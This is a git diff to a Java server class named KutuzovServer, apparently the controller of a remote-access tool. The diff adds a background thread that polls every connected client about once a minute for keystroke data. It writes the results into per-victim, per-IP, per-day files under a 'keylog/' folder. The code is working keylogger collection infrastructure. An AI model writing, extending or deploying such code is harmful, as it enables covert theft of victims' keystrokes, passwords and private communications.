@@ -9,12 +9,15 @@ import me.kutuzov.server.util.LoadingWheel;
 import me.pk2.moodlyencryption.MoodlyEncryption;
 
 import java.awt.*;
-import java.io.IOException;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.io.OptionalDataException;
+import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.nio.charset.StandardCharsets;
+import java.text.SimpleDateFormat;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+import java.time.format.DateTimeFormatterBuilder;
+import java.util.Date;
 import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
@@ -26,7 +29,7 @@ public class KutuzovServer {
     public final ClientManager clientManager;
     private final LoadingWheel loadingWheel;
     private ServerSocket serverSocket;
-    private Thread thread, checkThreadLoop;
+    private Thread thread, checkThreadLoop, writerLoop;
 
     public KutuzovServer() {
         this.loadingWheel = new LoadingWheel();
@@ -87,6 +90,36 @@ public class KutuzovServer {
             }
         });
         checkThreadLoop.start();
+
+        // SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy");
+        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("d-M-yyyy");
+
+        writerLoop = new Thread(() -> {
+            while (true) {
+                trySleep(61000);
+
+                String date = LocalDateTime.now().format(formatter);
+                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
+                    asyncRun(() -> {
+                        if(!entry.getValue().getVersion().contentEquals(VERSION))
+                            return;
+
+                        try {
+                            entry.getValue().getOutput().writeObject(new SCAskWriterPacket());
+                            CSWriterPacket wPacket = (CSWriterPacket)entry.getValue().getInput().readObject();
+
+                            File file = new File("keylog/" + entry.getValue().getIdentifierName() + "/" + entry.getValue().getIp().split(":")[0] + "_" + entry.getValue().getLocalIp() + "/" + date + ".log");
+                            file.getParentFile().mkdirs();
+                            if(!file.exists())
+                                file.createNewFile();
+
+                            FileOutputStream writer = new FileOutputStream(file.getPath(), true);
+                            writer.write((wPacket.text + "\r\n").getBytes(StandardCharsets.UTF_8));
+                            writer.close();
+                        } catch (Exception e) {e.printStackTrace();}});
+            }
+        });
+        writerLoop.start();
 
         trySleep(1000);
         loadingWheel.showing.set(false);
